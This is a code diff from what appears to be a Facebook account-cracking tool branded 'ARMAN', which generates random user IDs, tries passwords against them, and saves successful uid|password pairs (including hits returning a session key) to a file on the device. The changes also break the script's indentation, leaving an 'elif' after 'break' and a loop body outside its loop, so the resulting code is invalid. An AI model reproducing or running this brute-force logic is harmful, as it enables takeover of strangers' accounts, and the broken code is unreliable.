@@ -469,8 +469,8 @@ def old_One():
     linex()
     star = '10000'
     for _ in range(int(limit)):
-        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
-        user.append(data)
+    data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+    user.append(data)
     print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
     linex()
@@ -479,13 +479,13 @@ def old_One():
         ____banner____()
         print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
         open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
+        oks.append(uid)
+        break
+        elif 'session_key' in po:
+        print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+        open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+        oks.append(uid)
+        break
         except Exception as e:
             pass
     loop += 1
